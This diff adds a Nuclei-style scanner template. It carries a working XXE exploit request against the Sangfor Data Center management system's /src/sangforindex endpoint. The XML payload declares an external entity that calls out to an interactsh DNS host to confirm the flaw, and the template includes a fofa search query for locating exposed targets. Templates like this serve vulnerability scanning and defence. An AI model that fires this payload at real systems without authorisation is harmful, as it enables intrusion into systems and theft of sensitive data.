@@ -1,0 +1,41 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - contains(interactsh_protocol, "dns")
+          type: dsl
+      raw:
+        - |
+          POST /src/sangforindex HTTP/1.1
+          Host: your-ip
+          Content-Type: text/xml
+
+          <?xml version="1.0" encoding="utf-8" ?>
+          <!DOCTYPE root [
+              <!ENTITY rt SYSTEM "http://{{dns}}">
+          ]>
+          <xxx>
+          &rt;
+          </xxx>
+id: sangfor-dc-xxe-sangforindex
+info:
+    author: hufei
+    description: |
+        深信服数据中心管理系统DC存在XML外部实体注入漏洞。由于后端对传入的XML对象进行了非预期内解析，攻击者可以利用该漏洞进行XML注入攻击，获取系统敏感信息。
+    metadata:
+        fofa-query: SANGFOR 数据中心
+        hunter-query: null
+        max-request: 3
+        verified: true
+    name: angfor-dc-xxe-sangforindex
+    reference: https://blog.csdn.net/qq_41904294/article/details/132310337
+    severity: critical
+    tags:
+        - HVV
+        - 深信服
+        - dc
+        - xxe
+        - sangfor
+variables:
+    cmd: ping {{dns}}
+    dns: '{{interactsh-url}}'
